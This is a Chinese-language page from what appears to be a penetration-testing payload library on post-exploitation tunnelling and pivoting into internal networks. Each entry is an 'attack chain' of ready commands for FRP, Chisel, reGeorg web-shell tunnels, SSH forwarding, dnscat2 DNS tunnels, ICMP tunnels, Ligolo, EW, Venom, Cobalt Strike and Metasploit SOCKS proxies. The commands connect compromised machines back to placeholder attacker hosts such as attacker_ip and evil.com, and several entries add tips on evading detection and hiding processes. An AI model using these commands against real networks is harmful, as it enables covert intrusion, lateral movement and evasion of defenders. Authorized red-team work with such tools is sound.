# 内网/后渗透 — 隧道代理 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:reGeorg / frp / Chisel / ICMP tunnel / DNS tunnel / SOCKS / ssh -D / iox / nps

---

### FRP内网穿透  `tunnel-frp`
使用FRP建立内网穿透隧道
子类：**TCP隧道** · tags: `frp` `tunnel` `proxy` `nat`

**前置条件：** 公网服务器；内网机器可访问公网；FRP工具

**攻击链：**

**1. 服务端配置**  _[linux]_
_FRP服务端配置文件frps.ini_
```
[common]
bind_port = 7000
```

**2. 客户端配置**  _[windows]_
_FRP客户端配置文件frpc.ini_
```
[common]
server_addr = attacker_ip
server_port = 7000

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 3389
```

**3. 启动服务端**  _[linux]_
_启动FRP服务端_
```
./frps -c frps.ini
```

**4. 启动客户端**  _[windows]_
_启动FRP客户端_
```
frpc.exe -c frpc.ini
```

**分析：** FRP可以建立TCP隧道，将内网服务映射到公网。

**OPSEC：** FRP流量可能被检测；考虑使用加密传输；注意隐藏进程

---

### Chisel内网穿透  `tunnel-chisel`
使用Chisel建立内网穿透隧道
子类：**HTTP隧道** · tags: `chisel` `tunnel` `proxy` `http`

**前置条件：** 公网服务器；内网机器可访问公网；Chisel工具

**攻击链：**

**1. 服务端**  _[linux]_
_启动Chisel服务端_
```
./chisel server -p 8000 --reverse
```

**2. 反向SOCKS**  _[windows]_
_建立反向SOCKS代理_
```
chisel.exe client attacker_ip:8000 R:socks
```

**3. 端口转发**  _[windows]_
_端口转发_
```
chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
```

**分析：** Chisel可以建立HTTP隧道，穿透防火墙。

**OPSEC：** Chisel使用HTTP协议；可以绑定域名伪装；流量加密

---

### ReGeorg隧道  `tunnel-regeorg`
通过Web Shell建立隧道
子类：**ReGeorg** · tags: `tunnel` `regeorg` `proxy`

**前置条件：** Web Shell上传；支持脚本语言

**攻击链：**

**1. 上传隧道脚本**
_上传对应语言的隧道脚本_
```
上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器
```

**2. 建立隧道**  _[linux]_
_启动SOCKS代理_
```
python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
```

**3. 配置代理**  _[linux]_
_通过代理扫描_
```
proxychains nmap -sT -Pn target
```

---

### SSH本地转发  `tunnel-ssh-local`
SSH本地端口转发
子类：**SSH** · tags: `ssh` `tunnel` `local`

**前置条件：** SSH访问权限

**攻击链：**

**1. 本地转发**  _[linux]_
_将目标80端口映射到本地8080_
```
ssh -L 8080:target:80 user@jump
```

---

### SSH远程转发  `tunnel-ssh-remote`
SSH远程端口转发
子类：**SSH** · tags: `ssh` `tunnel` `remote`

**前置条件：** SSH访问权限

**攻击链：**

**1. 远程转发**  _[linux]_
_将本地80端口映射到远程8080_
```
ssh -R 8080:localhost:80 user@jump
```

---

### SSH动态转发  `tunnel-ssh-dynamic`
SSH动态SOCKS代理
子类：**SSH** · tags: `ssh` `tunnel` `socks`

**前置条件：** SSH访问权限

**攻击链：**

**1. 动态转发**  _[linux]_
_创建SOCKS代理_
```
ssh -D 1080 user@jump
```

**2. 使用代理**  _[linux]_
_通过SOCKS代理访问_
```
proxychains nmap -sT -Pn target
```

---

### DNS隧道  `tunnel-dns`
通过DNS协议建立隧道
子类：**DNS** · tags: `dns` `tunnel` `covert`

**前置条件：** DNS解析权限；可控域名

**攻击链：**

**1. 使用dnscat2**  _[linux]_
_启动dnscat2服务器_
```
ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
```

**2. 客户端连接**  _[windows]_
_客户端连接到服务器_
```
dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
```

**3. 建立隧道**  _[linux]_
_建立SOCKS隧道_
```
session -i 1
listen 127.0.0.1:1080 10.0.0.1:1080
```

---

### ICMP隧道  `tunnel-icmp`
通过ICMP协议建立隧道
子类：**ICMP** · tags: `icmp` `tunnel` `covert`

**前置条件：** ICMP允许通过；管理员权限

**攻击链：**

**1. 使用icmptunnel**  _[linux]_
_服务端启动_
```
icmptunnel -s 10.0.0.1
```

**2. 客户端连接**  _[linux]_
_客户端连接_
```
icmptunnel -c attacker.com
```

---

### Ligolo隧道  `tunnel-ligolo`
Ligolo内网穿透工具
子类：**Ligolo** · tags: `ligolo` `tunnel` `proxy`

**前置条件：** 可执行代理程序

**攻击链：**

**1. 启动服务端**  _[linux]_
_启动Ligolo代理服务_
```
sudo proxy -selfcert
```

**2. 运行代理**  _[windows]_
_目标机器运行代理_
```
agent.exe -connect attacker:11601 -ignore-cert
```

**3. 创建隧道**  _[linux]_
_创建隧道接口_
```
session
start
```

---

### SOCKS代理  `socks-proxy`
建立SOCKS代理访问内网
子类：**SOCKS** · tags: `socks` `proxy` `tunnel`

**前置条件：** 已有内网访问点

**攻击链：**

**1. SSH SOCKS代理**  _[linux]_
_SSH动态端口转发_
```
ssh -D 1080 user@jumpserver
或
ssh -D 1080 -N -f user@jumpserver
```

**2. ProxyChains配置**  _[linux]_
_配置ProxyChains_
```
编辑 /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

使用:
proxychains nmap -sT target
```

**3. Cobalt Strike SOCKS**  _[windows]_
_CS SOCKS代理_
```
beacon> socks 1080
在CS中启动SOCKS代理
```

**4. Metasploit SOCKS**  _[linux]_
_MSF SOCKS代理_
```
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

---

### Ngrok内网穿透  `tunnel-ngrok`
使用Ngrok建立内网穿透
子类：**Ngrok** · tags: `ngrok` `tunnel` `penetration`

**前置条件：** Ngrok账号；可访问外网

**攻击链：**

**1. 安装Ngrok**
_安装并配置Ngrok_
```
下载: https://ngrok.com/download
tar -xvzf ngrok.zip
./ngrok authtoken YOUR_TOKEN
```

**2. HTTP隧道**
_创建HTTP隧道_
```
./ngrok http 80
将本地80端口映射到公网
```

**3. TCP隧道**
_创建TCP隧道_
```
./ngrok tcp 3389
将本地3389端口映射到公网
```

**4. 自定义域名**
_使用自定义域名_
```
./ngrok http -hostname=custom.domain.com 80
```

---

### EW内网穿透  `tunnel-ew`
使用EW建立内网穿透
子类：**EW** · tags: `ew` `tunnel` `socks`

**前置条件：** 已有内网访问点

**攻击链：**

**1. 正向代理**  _[linux]_
_正向SOCKS代理_
```
./ew -s ssocksd -l 1080
在跳板机上启动SOCKS代理
```

**2. 反向代理**  _[linux]_
_反向SOCKS代理_
```
攻击机: ./ew -s rcsocks -l 1080 -e 8888
跳板机: ./ew -s rssocks -d attacker_ip -e 8888
```

**3. 多级级联**  _[linux]_
_多级级联_
```
./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
多级跳板穿透
```

---

### Venom内网穿透  `tunnel-venom`
使用Venom建立内网穿透
子类：**Venom** · tags: `venom` `tunnel` `socks`

**前置条件：** 已有内网访问点

**攻击链：**

**1. 启动服务端**  _[linux]_
_启动服务端_
```
./venom_server -lport 9999
在攻击机启动服务端
```

**2. 连接客户端**
_连接服务端_
```
./venom_client -rhost attacker_ip -rport 9999
在跳板机连接服务端
```

**3. 建立SOCKS**
_建立SOCKS代理_
```
Venom > socks 1080
建立SOCKS代理
```

**4. 端口转发**
_端口转发_
```
Venom > lforward 127.0.0.1 3389 13389
将内网3389转发到本地13389
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`14-domain.md`](14-domain.md) · 下一篇:[`16-recon.md`](16-recon.md)
